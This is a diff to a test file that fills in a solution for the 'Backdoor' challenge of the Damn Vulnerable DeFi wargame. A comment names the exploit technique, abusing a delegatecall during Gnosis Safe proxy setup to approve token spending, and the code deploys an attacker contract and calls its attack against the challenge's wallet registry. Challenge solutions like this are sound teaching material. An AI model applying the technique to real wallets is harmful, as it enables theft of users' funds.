@@ -45,7 +45,16 @@ describe('[Challenge] Backdoor', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // There is a delegatecall() during the initialization of GnosisSafeProxy, which we can use to approve the
+        // dvt token spendings.
+        // https://www.linkedin.com/pulse/damn-vulnerable-defi-v3-backdoor-challenge-11-solution-johnny-time-bsmee/
+        const attacker = await (await ethers.getContractFactory('WalletRegistryAttacker')).deploy(
+            masterCopy.address,
+            walletFactory.address,
+            walletRegistry.address,
+            token.address
+        );
+        await attacker.connect(player).attack(users);
     });
 
     after(async function () {
